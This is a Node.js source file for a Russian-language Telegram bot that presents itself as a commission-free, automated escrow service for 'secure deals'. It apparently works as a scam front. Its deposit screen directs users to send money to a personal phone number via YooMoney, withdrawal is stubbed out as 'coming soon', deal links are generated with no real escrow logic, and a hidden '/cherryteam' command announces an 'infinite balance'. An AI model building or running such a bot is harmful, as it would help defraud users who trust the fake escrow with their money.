require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Главное меню
async function showMainMenu(ctx) {
  const caption = `👋 Добро пожаловать!\n\n💼 Надёжный сервис для безопасных сделок!\n✨ Автоматизировано, быстро и без лишних хлопот!\n\n🔹 Никакой комиссии\n🔹 Поддержка 24/7\n\n💌 Теперь ваши сделки под защитой! 🛡`;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🌏 Открыть в приложении', 'open_app'),
      Markup.button.callback('📁 Мои сделки', 'my_deals')
    ],
    [Markup.button.callback('⚙️ Настройки', 'settings')]
  ]);

  await ctx.reply(caption, { 
    parse_mode: 'Markdown',
    ...keyboard
  });
}

// Обработка кнопок
bot.action('open_app', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('🌏 Веб-приложение будет доступно скоро!');
});

bot.action('my_deals', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('📁 У вас пока нет сделок');
});

bot.action('settings', async (ctx) => {
  const caption = `⚙️ *Настройки*\n\n💰 Баланс: 0₽\n🌎 Язык: Русский`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💰 Баланс', 'balance_menu')],
    [Markup.button.callback('⏪ Назад', 'main_menu')]
  ]);

  await ctx.editMessageText(caption, { 
    parse_mode: 'Markdown',
    ...keyboard
  });
});

bot.action('balance_menu', async (ctx) => {
  const caption = `💰 *Баланс: 0₽*\n\nВыберите действие:`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📥 Пополнить', 'deposit')],
    [Markup.button.callback('📤 Вывести', 'withdraw')],
    [Markup.button.callback('⏪ Назад', 'settings')]
  ]);

  await ctx.editMessageText(caption, { 
    parse_mode: 'Markdown',
    ...keyboard
  });
});

bot.action('deposit', async (ctx) => {
  const caption = `📥 *Пополнение баланса*\n\nЧтобы пополнить баланс, отправьте нужную сумму на:\n\n📞 89202555790\n💳 Юмани`;
  await ctx.editMessageText(caption, { parse_mode: 'Markdown' });
});

bot.action('withdraw', async (ctx) => {
  await ctx.editMessageText('📤 Вывод средств будет доступен скоро!');
});

bot.action('main_menu', async (ctx) => {
  await ctx.deleteMessage().catch(() => {});
  await showMainMenu(ctx);
});

// Команда создания сделки
bot.command('create', async (ctx) => {
  const dealId = Math.random().toString(36).substring(2, 8).toUpperCase();
  const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;

  const caption = `💥 Сделка успешно создана!\n\nТип сделки: Общая\n\nОтдаете: \nПолучаете: \n\n⛓️ Ссылка для покупателя:\n${dealLink}`;
  
  await ctx.reply(caption, { parse_mode: 'Markdown' });
});

// Обработка старта
bot.start(async (ctx) => {
  await showMainMenu(ctx);
});

// Админские команды
bot.command('cherryteam', async (ctx) => {
  await ctx.reply('🍒 Бесконечный баланс активирован!');
});

bot.command('deals', async (ctx) => {
  await ctx.reply('📊 Сделок пока нет');
});

bot.command('ban', async (ctx) => {
  await ctx.reply('🚫 Команда бана работает!');
});

// Запуск бота
bot.launch().then(() => {
  console.log('✅ Бот запущен!');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
